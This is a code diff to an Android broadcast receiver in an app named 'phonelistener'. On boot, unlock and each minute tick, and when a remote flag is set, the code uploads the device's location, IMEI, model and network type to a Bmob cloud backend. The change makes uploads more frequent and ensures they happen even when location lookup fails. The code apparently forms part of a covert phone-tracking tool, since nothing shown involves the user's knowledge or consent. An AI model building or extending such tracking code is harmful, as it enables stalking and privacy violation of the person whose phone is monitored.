@@ -3,6 +3,7 @@ package com.wpl.phonelistener.broadcast;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.util.Log;
 
 import com.wpl.phonelistener.bean.ClientUser;
 import com.wpl.phonelistener.bean.FeedbackData;
@@ -60,15 +61,19 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
         switch (intent.getAction()) {
             case ACTION_BOOT:   //开机广播
                 received();
+                Log.e("MyBroadcastReceiver", "开机广播");
                 break;
             case ACTION_REBOOT: //重启广播
                 received();
+                Log.e("MyBroadcastReceiver", "重启广播");
                 break;
             case ACTION_USERPRESENT:    //解锁屏幕广播
                 received();
+                Log.e("MyBroadcastReceiver", "解锁屏幕广播");
                 break;
             case ACTION_TIMETICK:   //时间变化广播
                 received();
+                Log.e("MyBroadcastReceiver", "时间变化广播");
                 break;
             default:
                 break;
@@ -77,7 +82,7 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
 
     /**
      * 1,收到广播,启动service
-     * 2,当前分钟数为10的整数，查询服务器数据
+     * 2,当前分钟数为5的倍数时，查询服务器数据
      */
     private void received() {
         if (!tools.isServiceRunning(MyService.class.getName())) {
@@ -86,7 +91,7 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
 
         calendar = java.util.Calendar.getInstance();
         int min = calendar.get(java.util.Calendar.MINUTE);
-        int m = min % 10;
+        int m = min % 5;
         if (m == 0) {
             if (tools.isConnected()) {
                 initBmob();
@@ -136,6 +141,7 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
      * 获取当前位置信息
      */
     private void getLocationData() {
+        Log.e("MyBroadcastReceiver", "获取定位信息");
         M_Presenter.CurrentLocation currentLocation = new CurrentLocationImpl(this);
         currentLocation.getLocation(context);
     }
@@ -143,21 +149,28 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
     @Override
     public void locationSuccess(Map<String, String> map) {
         if (map != null) {
-            if (map.get("result").equals("success")) {
-                upload(map);
-            }
+            upload(map);
         }
     }
 
     @Override
     public void locationError(Map<String, String> map) {
-
+        if (map != null) {
+            upload(map);
+        }
     }
 
     private void upload(Map<String, String> map) {
         new Thread(() -> {
             try {
                 FeedbackData fd = new FeedbackData();
+                if (map.get("result").equals("success")) {
+                    fd.setAoi(map.get("aoiName"));
+                    fd.setCity(map.get("city"));
+                    fd.setLat(map.get("lat"));
+                    fd.setLon(map.get("lon"));
+                    fd.setAddress(map.get("address"));
+                }
                 ClientUser clientUser = new ClientUser();
                 clientUser.setObjectId(objId);
                 fd.setBelongTo(clientUser);
@@ -166,12 +179,8 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
                 fd.setModel(tools.getModel());
                 fd.setNetType(tools.getNetType());
                 fd.setImei(tools.getImei());
-                fd.setAoi(map.get("aoiName"));
-                fd.setCity(map.get("city"));
-                fd.setLat(map.get("lat"));
-                fd.setLon(map.get("lon"));
-                fd.setAddress(map.get("address"));
                 Thread.sleep(10000);
+                Log.e("MyBroadcastReceiver", "开始上传数据");
                 fd.save(new SaveListener<String>() {
                     @Override
                     public void done(String s, BmobException e) {
@@ -190,13 +199,16 @@ public class MyBroadcastReceiver extends BroadcastReceiver implements M_View.Cur
      * 更新控制状态为false
      */
     private void upConsole() {
-
         ClientUser clientUser = new ClientUser();
         clientUser.setFeedback(false);
         clientUser.update(objId, new UpdateListener() {
             @Override
             public void done(BmobException e) {
-
+                if (e == null) {
+                    Log.e("MyBroadcastReceiver", "操作完成！");
+                } else {
+                    upConsole();
+                }
             }
         });
     }
